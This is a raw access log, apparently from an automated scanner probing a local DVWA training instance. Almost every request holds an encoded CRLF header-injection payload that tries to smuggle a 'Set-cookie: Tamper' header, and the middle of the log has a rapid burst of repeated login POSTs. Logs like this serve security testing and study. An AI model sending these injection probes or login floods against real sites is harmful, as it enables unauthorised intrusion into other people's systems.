172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=Set-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=Set-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%0D%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%0D%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%3F%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%3F%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%0D%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562%0D%0A HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%0D%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188%0D%0A HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/add_event_listeners.js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D8d70a284-7221-4a95-bdad-8427e2303562%0D%0A HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /dvwa/js/dvwaPage.js?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd154ad68-8a00-4cad-88ce-01513b39c188%0D%0A HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=Set-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=Set-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%0D%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%0D%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%3F%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%0D%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a%0D%0A HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /favicon.ico?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Db53a38e7-c02a-4ac3-b5ef-114e35e29b1a%0D%0A HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%3F%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%0D%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527%0D%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:51 +0000] "GET /instructions.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D7ca97a78-f28f-4e2f-846d-0b87b08f2527%0D%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=Set-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=Set-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%0D%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%3F%0D%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%0D%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%3F%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%3F%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%0D%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79%0D%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%0D%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e%0D%0A HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /instructions.php?doc=any%3F%0D%0ASet-cookie%3A+Tamper%3D2db85969-d570-491d-b0d2-1098a4aace79%0D%0A HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /login.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D984a0d14-116c-4bcc-affe-c20f1bddf56e%0D%0A HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=Set-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=Set-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%0D%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%0D%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%3F%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%0D%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%3F%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dd71b0a42-0a08-4879-974a-70a7d8d4f1e3%0D%0A HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%0D%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178%0D%0A HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /robots.txt?query=any%3F%0D%0ASet-cookie%3A+Tamper%3Dbbd12a93-a032-4403-92c1-ecb5eda4e178%0D%0A HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=Set-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=Set-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710 HTTP/1.1" 200 6128 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%0D%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%0D%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%3F%0D%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "POST /setup.php?query=any%0ASet-cookie%3A+Tamper%3D4617a9c1-3fc3-47af-90ad-c152b776f479 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:52 +0000] "GET /setup.php?query=any%0ASet-cookie%3A+Tamper%3D549744f4-73a9-4eb1-bfae-6bd60f349710 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
